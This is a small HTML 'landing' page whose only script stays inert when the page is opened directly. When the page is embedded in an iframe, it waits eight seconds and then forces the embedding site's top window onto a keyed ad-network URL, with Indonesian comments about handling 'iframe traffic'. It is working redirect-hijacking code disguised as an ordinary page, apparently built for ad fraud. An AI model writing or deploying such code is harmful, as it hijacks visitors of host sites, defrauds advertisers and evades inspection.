<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Landing</title>
</head>
<body>

<h1>landing-redirect</h1>

<script>
(function () {

  // Jangan redirect kalau dibuka langsung
  if (window.self === window.top) return;

  // Delay aman untuk iframe traffic
  setTimeout(function () {
    try {
      window.top.location.replace("https://www.effectivegatecpm.com/w8cegamjw?key=404b96366a647361eb95f0a5480a19c1");
    } catch (e) {
      window.location.href = "https://www.effectivegatecpm.com/w8cegamjw?key=404b96366a647361eb95f0a5480a19c1";
    }
  }, 8000);

})();
</script>

</body>
</html>
